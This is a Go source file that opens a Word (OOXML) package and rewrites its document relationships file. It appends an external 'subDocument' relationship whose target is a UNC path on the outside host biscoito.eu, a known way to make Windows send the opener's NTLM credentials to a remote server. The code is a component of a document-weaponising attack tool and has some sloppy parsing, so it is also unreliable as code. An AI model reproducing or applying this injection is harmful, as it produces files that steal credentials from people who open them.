package ooxml

import (
	"archive/zip"
	"encoding/xml"
	"fmt"
	"io"
	"log"
	"sort"
	"strconv"
)

func ReadPackage(fileName string) error {
	log.Println("Opening document...")

	// Open a zip archive for reading.
	r, err := zip.OpenReader(fileName)
	if err != nil {
		return err
	}
	defer r.Close()

	// Iterate through the files in the archive.
	for _, f := range r.File {
		rc, err := f.Open()
		if err != nil {
			return err
		}

		xmlBytes, err := io.ReadAll(rc)
		if err != nil {
			return err
		}
		rc.Close()

		err = WritePackage(f, xmlBytes)
		if err != nil {
			return err
		}
	}

	return nil
}

func WritePackage(zipFile *zip.File, xmlData []byte) error {
	switch zipFile.Name {
	case CDocumentXMLRels:
		// log.Printf("\nContents of %s: %s\n", f.Name, xml_formatted)

		rs := Relationships{}
		xml.Unmarshal(xmlData, &rs)

		log.Printf("Local: %s Space: %s", rs.XMLName.Local, rs.XMLName.Space)

		var idList []int
		for _, rel := range rs.Relationships {
			i, _ := strconv.Atoi(rel.Id[len(rel.Id)-1:])
			idList = append(idList, i)
		}
		sort.Ints(idList)
		targetId := idList[len(idList)-1] + 1

		rs.Relationships = append(rs.Relationships, Relation{
			Id:         fmt.Sprintf("rId%d", targetId),
			Type:       "http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument",
			Target:     `file:///\\biscoito.eu\test\`,
			TargetMode: "External",
		})

		parsedXml, _ := xml.MarshalIndent(rs, "", "  ")
		log.Printf("%s", string(parsedXml[:]))

	case CDocument:
	case CStyles:
	default:
	}

	return nil
}
